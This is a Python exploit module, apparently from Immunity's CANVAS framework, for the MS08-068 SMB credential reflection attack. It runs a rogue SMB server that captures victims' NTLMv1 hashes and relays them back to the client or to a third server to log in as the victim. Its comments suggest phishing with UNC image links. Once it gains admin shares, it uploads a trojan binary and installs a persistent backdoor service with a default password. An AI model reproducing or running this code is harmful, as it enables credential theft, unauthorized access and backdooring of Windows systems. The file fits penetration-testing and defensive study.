##ImmunityHeader v1 
###############################################################################
## File       :  ms08_068.py
## Description:  
##            :  
## Created_On :  Mon Sep 28 14:03:37 2009
## Created_By :  Justin Seitz
## Modified_On:  
## Modified_By:  
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

# NOTE: if you can talk SMB to it, OWN IT WITH ms08_067!

# a more interesting usage of this is to do a MITM with this module
# where instead of connecting back to the client, you connect to
# a server you know they have creds on .. scoop the challenge key
# from there, and then feed it back to them .. they give you their
# creds, and now you can finish logging in on the target system :P

# Scenario for MITM reflection:
#
# [A] Client - Target
# [B] CANVAS SMB Server
# [C] Server - Target
#
# 1) [A] chats SMB to [B] e.g. using UNC img src with "\\ip.of.B\"
# 2) [B] will connect to [C] to retrieve a challenge key
# 3) [B] uses [C]'s challenge key in SMB session with [A]
# 4) [A] auths to [B] using hashes based on provided challenge key
# 5) [B] reflects [A]'s hashes to the still active session to [C]
# 6) [B] is now authenticated to [C] as [A]
#
# This module runs as a server, with MITM mode turned on it will
# reflect any and all creds to a target machine until it gets
# the desired level of access ... this is useful when you're
# phishing for admin creds :)

import sys
if '.' not in sys.path: 
    sys.path.append('.')

import struct
from smbserver import *
from msrpc import *
import libs.newsmb.libdcerpc as libdcerpc

# GUI info
NAME                            = 'SMB Credential Reflection (MS08-068)'
DESCRIPTION                     = 'SMB Credential Reflection'
DOCUMENTATION                   = {}
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['CVE Name']       = 'CVE-2008-4037'
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION['References']     = ''
DOCUMENTATION['NOTES']          = """
The default reflection mode will attempt to exploit MS08-068, by reflecting
credentials back to connecting clients. When you enable reflection to the
current target, the server will try to authenticate to the specified target
instead of back to the client. The latter is an NTMLv1 protocol attack
and remains unaddressed by Microsoft.

If the server establishes Administrator level access to a connected client
or the current target, it will proceed to install a MOSDEF Backdoor Service
by default. You can disable this behavior via the backdoor mode checkbox.
"""
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Servers'
VERSION                         = '0.1'

class ms08_068_ClientSMB(SMB):
    ## this class handles the actual reflecting SMB session
    def __init__(self, host, port=445, getsock=None):
        SMB.__init__(self, host, port=port, getsock=getsock)
        self.client_addr    = host
        self.client_port    = port
        self.client_owned   = False
        return
    
    def get_challenge_key(self):
        ## smb_negotiate with client to get challenge key
        self.s = self.getsock.gettcpsock()
        try:
            self.s.connect((self.client_addr, self.client_port))
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            return None      
        
        print "Trying to negotiate client SMB session"
        error, errstr, capabilities, key, domain, server = smb_negotiate(self.s)
        return (error, errstr, capabilities, key, domain, server)
    
    def continue_session(self, capabilities, key, domain, server, account, ansi_password, uni_password):
        ## continues the client session connect      
        auth            = NTLM()
        auth.password   = 'bogus'
        auth.username   = account
        auth.domain     = domain
        auth.challenge  = key 
        auth.type       = NTLMSSP_AUTH
        
        # dave says, and I quote, "for the love of god, don't use NTLMv2"
        auth.set_ntlm_version(1)

        if capabilities & 0x4:
            print "Auth unicode 1"
            auth.set_unicode(1)
        else:
            print "Auth unicode 0"
            auth.set_unicode(0)
            
        # NTLM.raw libs/canvasntlm.py ... reflect scooped passwords
        auth.raw(my_nt_key=uni_password,\
                 my_lm_key=ansi_password,\
                 my_challenge=key)
        
        error,errstr,uid,os,lanman,domain=smb_session_setup(self.s, auth, capabilities, domain=domain)
        if error:
            print "Error: %s" % errstr
            return 0
        else:
            print "Succesfully reflected creds!"
            
        self.uid    = uid
        self.set_timeout(self.timeout)
        self.os     = os
        self.lanman = lanman
        self.domain = domain
        self.server = server
        
        print "SMB Client Connected :>"
        return 1
        
class ms08_068_ServerSMB(SMBServer):
    ## this class handles the initial incoming client
    def __init__(self, host, port, getsock=None, mitm_addr=None):
        SMBServer.__init__(self, host, port)
        self.mitm_addr      = mitm_addr
        self.client_addr    = '127.0.0.1'
        self.client_smb     = None
        self.client_session = None
        self.client_port    = 445
        self.getsock        = getsock
        return
    
    def init_client_session(self):
        ## inits a SMB session back to the client
        self.client_smb = ms08_068_ClientSMB(self.client_addr,\
                                             port=self.client_port,\
                                             getsock=self.getsock)
        return self.client_smb.get_challenge_key()
    
    def init_mitm_session(self):
        ## inits a SMB session to a 3rd server
        self.client_smb = ms08_068_ClientSMB(self.mitm_addr,\
                                             port=self.client_port,\
                                             getsock=self.getsock)
        return self.client_smb.get_challenge_key()
        
    def accept(self):
        ## accept clients .. timeout quickly so we can check state ...
        self.s.set_timeout(2)
        try: 
            (self.clientsock,addr) = self.s.accept()
        except:
            print "SMBServer accept timed out ..."
            return 0
        
        print "SMBServer accepted client: %s:%d" % (addr[0],addr[1])
        self.client_addr = addr[0]
        return 1
    
    def negotiateprotocol(self, header, params, body):
        ## modified SMB protocol negotiation handshake
        
        # XXX: need to bitmask these headers out properly
        wordcount       = header[10]
        data            = body
        prots           = data.split('\x02')
        index           = prots.index('NT LM 0.12\x00')
        flags           = 0x88
        flags2          = 0xc001
        mid             = 1
        # parameters
        paramformat     = '<HBHHLLLL8sHB'
        dialectindex    = index-1
        securitymode    = 0x3 # use password/etc.
        maxmpxcount     = 50
        maxVCs          = 1
        maxbuffersize   = 16644
        maxrawbuffer    = 65536
        sessionkey      = 0
        capabilities    = 0x0000e3fd
        systemtime      = '\x00'*8
        servertimezone  = 0x01e0
        
        # retrieve challenge key from client/server
        if not self.mitm_addr:
            self.client_session = self.init_client_session()
        else:
            self.client_session = self.init_mitm_session()
            
        if not self.client_session:
            return 0
        if self.client_session[0]:
            print "Error: " + repr(self.client_session)
            return 0
        else:
            print "Got challenge key \\o/ : " + \
                  self.dump_hash(self.client_session[3])
        
        # now we have their challenge key, we give it back to them
        # and force auth, to obtain a valid password hash :P
        key = self.client_session[3]
        
        params = struct.pack(           \
                    paramformat,        \
                    dialectindex,       \
                    securitymode,       \
                    maxmpxcount,        \
                    maxVCs,             \
                    maxbuffersize,      \
                    maxrawbuffer,       \
                    sessionkey,         \
                    capabilities,       \
                    systemtime,         \
                    servertimezone,     \
                    len(key)            )
            
        data = key
        data += msunistring(self.client_session[4]) # Primary Domain
        data += msunistring('MALICE') # Server
        
        self.sendsmb(SMB_NEGOTIATE_PROTOCOL,    \
                     SMB_SUCCESS,               \
                     flags,                     \
                     flags2,                    \
                     self.tid,                  \
                     self.mid,                  \
                     params,                    \
                     data)
        return 1

    def dump_hash(self, raw):
        hash = ''
        for c in raw:
            hash += '%.2x' % ord(c)
        return hash
    
    def parse_uni(self, i, data):
        uni = ''
        while data[i:i+2] != '\x00\x00':
            uni += data[i:i+2]
            i += 2
        uni += data[i:i+2]
        return uni

    def respond_to_smb_request(self,data):
        ## SMB request handler
        format  = '<4sBLBH12sHHHHB'
        size    = struct.calcsize(format)
        print "SMB header size: %d" % size
        header  = struct.unpack(format,data[:size])
        (_,cmd,status,flags,flags2,sig,tid,pid,uid,mid,wordcount)=header
        self.pid    = pid
        self.uid    = uid
        self.mid    = mid
        params      = data[size:size+wordcount*2]
        data2       = data[size+wordcount*2:]
        if cmd not in self.response_functions.keys():
            print "%x not in response functions!" % cmd
            return 0
        # here we get creds to reflect back
        if cmd == 0x73:
            if wordcount != 13:
                print "Unexpected WordCount ... can't parse this Session Setup AndX"
                return 0
            print "Session Setup AndX request baby!"
            # we can parse out the info we need here
            print "Parsing parameters ..."
            params              = struct.unpack('<BBHHHHLHHLL', params)
            print repr(params)
            ansi_password_len   = params[7]
            uni_password_len    = params[8]
            print "ANSI len: %d | UNI len: %d" % (ansi_password_len, uni_password_len)
            print "Parsing data ..."
            print repr(data)
            i               = 2
            ansi_password   = data2[i:i+ansi_password_len]; i += ansi_password_len
            uni_password    = data2[i:i+uni_password_len]; i += uni_password_len
            # parse out account (kludge)
            account         = self.parse_uni(i, data2); i += len(account)
            domain          = self.parse_uni(i, data2); i += len(domain)
            OS              = self.parse_uni(i, data2); i += len(OS)
            LM              = self.parse_uni(i, data2); i += len(LM)        
            print "Scooped up creds from client LOL ..."
            print "Account: %s" % account
            print "ANSI password: " + self.dump_hash(ansi_password)
            print "UNI password: " + self.dump_hash(uni_password)
            print "Domain: %s" % domain
            print "OS: %s" % OS
            print "LM: %s" % LM
            # now we continue our client session with their own creds
            if self.client_smb.continue_session(self.client_session[2],\
                                             self.client_session[3],\
                                             self.client_session[4],\
                                             self.client_session[5],\
                                             account,\
                                             ansi_password,\
                                             uni_password):
                print "SMB Session continued ..."
                self.client_smb.client_owned = True
            else:
                print "SMB Session halted ..."
                self.client_smb.s.close()
                self.client_smb = None
            # our server can go bye bye now
            return 0
        # business as usual
        self.response_functions[cmd](header,params,data2)
        return 1
        
from tcpexploit import tcpexploit
from exploitutils import *

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.version        = 0
        self.mitm           = False
        self.share          = 'C$'
        self.trojan         = False
        self.servicename    = 'MOSDEFService'
        self.displayname    = 'MOSDEF Service'
        self.binaryname     = 'mosdefservice.exe'
        self.serviceport    = 1234
        return

    def neededListenerTypes(self):
        return []

    def getargs(self):
        # mitm controls whether or not to exploit ms08-068 or do regular reflection
        self.host           = self.target.interface
        self.mitm           = bool(int(self.argsDict.get('mitm', self.mitm)))
        self.share          = self.argsDict.get('share', self.share)
        self.trojan         = bool(int(self.argsDict.get('trojan', self.trojan)))
        # for service installs
        self.servicename    = self.argsDict.get('servicename', self.servicename)
        self.displayname    = self.argsDict.get('displayname', self.displayname)
        self.binaryname     = self.argsDict.get('binaryname', self.binaryname)
        self.serviceport    = int(self.argsDict.get('serviceport', self.serviceport))
        self.password       = self.argsDict.get('password', self.password)
        return 
        
    def test(self):
        return False
    
    def serve_smb(self, timeout=60*10):
        self.log('Starting malicious SMBServer')
        if self.mitm:
            ## this will use try to do a MITM reflection
            ## onto the SMB server specified by -t
            smbserver = ms08_068_ServerSMB('0.0.0.0',
                                           445,\
                                           getsock=self,\
                                           mitm_addr=self.host)
        else:
            ## this will try to do a MITM reflection back
            ## to the connecting client
            smbserver = ms08_068_ServerSMB('0.0.0.0',\
                                           445,\
                                           getsock=self)
        smbserver.timeout = timeout
        if not smbserver.listen():
            self.log('Could not listen!')
            smbserver = None
        return smbserver
    
    def reflector(self, smbserver):
        ## so we can loop this ...
        self.log('Accepting connection on 445 .. waiting for client')
        smbserver.client_smb = None
        if smbserver.accept():
            # could loop .. but meh
            smbserver.handle()
            smbserver.handle() # not a typo :>
        return smbserver.client_smb
    
    def get_smb_node(self, smb):
        from VFSNode import VFSNode
        from MOSDEFShellServer.SMB import SMBShellServer
        
        node            = VFSNode()
        node.parentnode = self.argsDict['passednodes'][0]
        newshell        = SMBShellServer(smb, node, self.host, self.logfunction)
        return node
    
    def install_service(self, smb,\
                        servicename='MOSDEFService',\
                        displayname='MOSDEF Service',\
                        binaryname='mosdefservice.exe',\
                        port=1234, \
                        password='immunity'):
        import mosdef
        # prepare service binary
        self.log('Using port %d and password %s' % (port, password))
        sourcefile  = 'backdoors/mosdefservice.exe'
        try:
            data = file(sourcefile, 'rb').read()
        except:
            self.log('Could not read service binary')
            return False
        
        self.log('Using port %d for MOSDEFService' % port)
        data        = data.replace(mosdef.assemble('push $5555', 'X86'),\
                                   mosdef.assemble('push $%d' % port, 'X86'))
        oldpassword = 'A'*16 + 'B'*16
        # pad password to 32 bytes
        data        = data.replace(oldpassword, password + '\x00'*(32-len(password)))
        sourcefile  = sourcefile + '.port_%d' % port
        destfile    = binaryname
        try:
            file(sourcefile, 'wb+').write(data)
        except:
            self.log('Could not write service binary')
            return False
            
        smb_upload  = self.engine.getModuleExploit('upload')
        smb_service = self.engine.getModuleExploit('installremotemosdefservice')
        smb_service.link(self)
        smb.treeconnect('ADMIN$')
        vfs = self.get_smb_node(smb)
        smb_upload.link(self, nodes=[vfs])
        smb_upload.argsDict['source']       = sourcefile
        smb_upload.argsDict['destfilename'] = destfile
        if not smb_upload.run():
            self.log('Could not upload trojan binary!')
            return False
        else:
            self.log('Uploaded trojan binary (%s) to %s' % (sourcefile, destfile))
            
        # connect to the pipe
        if not smb.pipeconnect('\\svcctl'):
            self.log('Could not connect to service control pipe!')
            return False
        self.log('Connected to service control pipe ...')
        
        # bind
        if not smb.dcebind('367abb81-9844-35f1-ad32-98f038001003', 2, 0, 0):
            self.log('Could not bind to UUID!')
            return False
        self.log('Bound to UUID ...')        

        # we already connected our SMB session, so we just set SMB and KEYWORD
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        smb_service.myDCE = libdcerpc.DCERPC(u'ncacn_np:127.0.0.1[\\svcctl]', self.gettcpsock())
        smb_service.myDCE.bind(u'367abb81-9844-35f1-ad32-98f038001003', u'2.0', auth_type=auth_type, auth_level=auth_level)

        #smb_service.myDCE.mysmb     = smb
        #smb_service.myDCE.keyword   = 'ncacn_np'

        from win32MosdefShellServer import SC_MANAGER_CREATE_SERVICE
        from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
        from win32MosdefShellServer import SERVICE_AUTO_START
        from win32MosdefShellServer import SERVICE_ERROR_IGNORE
        from win32MosdefShellServer import SERVICE_ALL_ACCESS
        from win32MosdefShellServer import SERVICE_BOOT_START
        from win32MosdefShellServer import SERVICE_AUTO_START
        pkt = smb_service.createOpenSCMPkt(accessmask=SC_MANAGER_CREATE_SERVICE)
        self.log("OpenSCManager sending %d bytes" % len(pkt))

        smb_service.myDCE.call(15, pkt, response=True)
        ret=smb_service.myDCE.reassembled_data

        success,policy_handle = smb_service.parseOpenSCMPkt(ret)
        if not success:
            self.log('Could not parseOpenSCMPkt!')
            return False
        
        self.log('We have a policy handle! Yay!')

        desiredaccess   = SERVICE_ALL_ACCESS
        atype           = SERVICE_WIN32_OWN_PROCESS
        errorcontrol    = SERVICE_ERROR_IGNORE
        starttype       = SERVICE_AUTO_START
        binarypath      = '%SYSTEMROOT%\\' + destfile
        self.log('Binary path: %s' % binarypath)
        loadorder       = 0
        dependencies    = None
        password        = None
        
        ret = smb_service.CreateService(policy_handle,\
                                        servicename,\
                                        displayname,\
                                        desiredaccess,\
                                        atype,\
                                        starttype,\
                                        errorcontrol,\
                                        binarypath,\
                                        loadorder,\
                                        dependencies,\
                                        servicename,\
                                        password)
        if ret not in [0,0x431]:
            self.log('Was unable to call CreateService!')
            return False
        self.log('Called create service successfully: %x ...' % ret)
        ret,handler = smb_service.OpenService(policy_handle,\
                                              servicename,\
                                              SERVICE_ALL_ACCESS) 
        if ret not in [0]:
            self.log('Was unable to call OpenService!')
            return False
        ret = smb_service.StartService(handler)        
        if not ret:
            self.log('Great MOSDEF success waiting on port %d!' % port)
        else:
            self.log('There was an error starting the MOSDEF service!')
            return False
           
        ret = smb_service.CloseServiceHandle(handler)           
        ret = smb_service.CloseServiceHandle(policy_handle)
                               
        return True
    
    def handle_success(self, smb, trojan=False):
        ## this decides what to do with an owned session
        ## returns True/False for service install, node for smb client
        # list of default/common shares to check
        shares = { 'ADMIN$':False,\
                   'C$':False,\
                   'D$':False,\
                   'IPC$':False,\
                   'SHARE':False,\
                   'My Documents':False }
        for share in shares:
            if smb.treeconnect(share):
                self.log('We can access %s' % share)
                shares[share] = True
        # do we want to backdoor the box?
        if shares['ADMIN$'] and shares['IPC$'] and trojan:
            self.log('We have ADMIN$ and IPC$ access ... installing MOSDEF service!')
            if self.install_service(smb,\
                                    servicename=self.servicename,\
                                    displayname=self.displayname,\
                                    binaryname=self.binaryname,\
                                    port=self.serviceport,\
                                    password=self.password):
                self.log('You can now use connect to service to backdoor :)')
                return True
            else:
                self.log('MOSDEF Service install failed ...')
                return False
        # fall back to the user specified SHARE
        else:
            # just download *?
            self.log('Lets connect to %s for now :P' % self.share)
            if not smb.treeconnect(self.share):
                self.log('Could not connect to %s ... checking others' % self.share)
                for share in shares:
                    if shares[share]:
                        if smb.treeconnect(share):
                            self.log('Using %s for SMB node ...' % share)
                            return self.get_smb_node(smb)
                    else:
                        self.log('Skipping %s for SMB node ...' % share)
            else:
                # just for now, really we want to install a MOSDEF service if we're admin
                return self.get_smb_node(smb)
    
    def run(self):
        ## you can turn on MITM mode, by setting self.mitm to True
        self.getargs()
        smbserver = self.serve_smb()
        if not smbserver:
            self.log('Could not start SMB Server')
            return None
        # so you can e.g. set up something that will reflect all creds
        # it receives to a single server you're interested in ...
        smb_nodes           = {}
        installed_services  = [] 
        while self.state != self.HALT:
            smb = self.reflector(smbserver)
            if smb and smb.client_owned:
                self.log('Handling owned SMB session ... (install service: %s)' % repr(self.trojan))
                session = self.handle_success(smb, trojan=self.trojan)
                # True/False for service installs
                if session in [True, False]:
                    if session:
                        if not self.mitm:
                            target = smbserver.client_addr
                        else:
                            target = smbserver.mitm_addr
                        self.log('Installed MOSDEF Service on %s' % target)
                        installed_services.append(target)
                # None/Object for smb nodes       
                else:
                    # just return the smb node if we're not backdooring
                    if session:
                        if not self.mitm:
                            target = smbserver.client_addr
                        else:
                            target = smbserver.mitm_addr
                        self.log('Established SMB Node on %s' % target)
                        smb_nodes[target] = session
                        
        self.log('Exiting SMB Reflector')
        if smbserver.s:
            smbserver.s.close()
        # dump ownage results on server exit
        for target in smb_nodes:
            self.log('Established SMB Node on %s' % target)
            # do something with the smb nodes here ?
        for target in installed_services:
            self.log('Installed MOSDEF Service on %s:%d with password %s' % (target,\
                                                                             self.serviceport,\
                                                                             self.password))
        return None
    
if __name__== '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
